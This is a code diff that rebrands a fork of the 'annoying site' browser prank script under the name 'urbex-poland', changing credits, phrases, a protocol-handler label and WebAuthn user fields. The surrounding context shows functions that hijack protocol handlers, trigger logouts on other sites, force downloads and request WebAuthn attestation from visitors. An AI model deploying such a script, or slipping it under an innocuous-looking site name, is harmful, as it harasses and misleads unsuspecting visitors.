@@ -1,27 +1,8 @@
 /*
-  ptoszek.pl
-  Powered by Jaczup
-
-  My version (ptoszek.pl): 
-  - https://github.com/jaczup/ptoszek.pl
-  Original version (theannoyingsite.com): 
-  - https://github.com/feross/TheAnnoyingSite.com/
-
-  Contact with me: https://jaczup.pl
-  Official Discord server (maintained in Polish language), get the PTOK tag: https://dc.ptoszek.pl
-
-  Contributors:
-    @jaczup - https://github.com/jaczup
-    @intexpression - https://github.com/intexpression
-    @dan64iel - https://github.com/dan64iel
-    @imzeme - https://github.com/imzeme
-    @GameShoot8050 - https://github.com/GameShoot8050
-    @wetraks -  https://github.com/wetraks
-    @cryblanka - https://github.com/cryblanka
-    @9fm - https://github.com/9fm
-    @MARECKIyt - https://github.com/MARECKIyt
-    @Hyd3r1 - https://github.com/Hyd3r1
-    @MariaWasNotAvailable - https://github.com/MariaWasNotAvailable
+  urbex-poland
+  Created / maintained by urb3x
+  - https://github.com/urb3x/urbex-poland
+  - https://urb3x.github.io/urbex-poland/
 */
 
 const SCREEN_WIDTH = window.screen.availWidth
@@ -81,7 +62,8 @@ const FILE_DOWNLOADS = [
 const PHRASES = [
   '🌶️',
   'Hot pepper',
-  'Ptoszek'
+  'urbex-poland',
+  'urb3x'
 ]
 
 const LOGOUT_SITES = {
@@ -384,7 +366,7 @@ function registerProtocolHandlers () {
   const handlerUrl = window.location.href + '/url=%s'
 
   protocolWhitelist.forEach(proto => {
-    navigator.registerProtocolHandler(proto, handlerUrl, 'Ptoszek')
+    navigator.registerProtocolHandler(proto, handlerUrl, 'urbex-poland')
   })
 }
 
@@ -712,14 +694,14 @@ function requestWebauthnAttestation () {
       publicKey: {
       // Relying Party (a.k.a. - Service):
         rp: {
-          name: 'Acme'
+          name: 'urbex-poland'
         },
 
         // User:
         user: {
           id: new Uint8Array(16),
-          name: 'lolica@jaczup.me',
-          displayName: 'Ptoszek Jaczupa'
+          name: 'givemeanon@proton.me',
+          displayName: 'givemeanon@proton.me'
         },
 
         pubKeyCredParams: [{
